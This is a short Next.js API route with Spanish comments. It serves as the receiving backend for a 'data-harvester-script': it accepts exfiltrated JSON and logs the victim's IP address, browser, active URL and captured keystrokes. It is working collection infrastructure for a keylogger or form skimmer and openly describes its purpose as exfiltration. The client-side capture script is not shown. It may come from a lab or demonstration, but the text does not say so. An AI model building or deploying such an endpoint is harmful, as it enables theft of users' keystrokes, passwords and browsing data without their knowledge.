import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    // 1. Extraemos el paquete JSON que nos envía tu "data-harvester-script"
    const data = await request.json();
    
    // 2. Imprimimos los datos en la consola del servidor (terminal local o logs de Netlify)
    console.log("\n===================================================");
    console.log("⚠️ NUEVOS DATOS RECOLECTADOS (EXFILTRACIÓN) ⚠️");
    console.log("IP Usuario:", data.ip || 'No detectada');
    console.log("Navegador:", data.userAgent);
    console.log("URL Activa:", data.currentURL);
    console.log("Teclas capturadas en este lote:", data.keystrokes ? data.keystrokes.length : 0);
    console.log("\n📝 JSON COMPLETO (PAYLOAD):");
    console.log(JSON.stringify(data, null, 2));
    console.log("===================================================\n");
    
    return NextResponse.json({ success: true, message: "Datos exfiltrados recibidos en el backend" });
  } catch (error) {
    console.error("Error al procesar la exfiltración:", error);
    return NextResponse.json({ success: false }, { status: 500 });
  }
}
